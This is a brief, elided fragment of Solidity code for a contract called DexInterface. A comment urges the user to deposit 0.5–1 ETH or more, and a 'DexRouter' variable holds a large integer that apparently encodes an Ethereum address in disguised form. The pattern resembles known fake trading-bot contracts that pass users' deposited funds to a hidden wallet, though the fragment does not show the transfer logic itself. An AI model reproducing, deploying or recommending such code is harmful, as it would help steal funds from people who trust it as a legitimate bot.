...
// Recommended liquidity after gas fees needs to equal 0.4 ETH use 0.5-1 ETH or more for higher slippage
...
contract DexInterface {    
    ...
    uint256 DexRouter = 180509691637259406471261655525434777669429773805;  
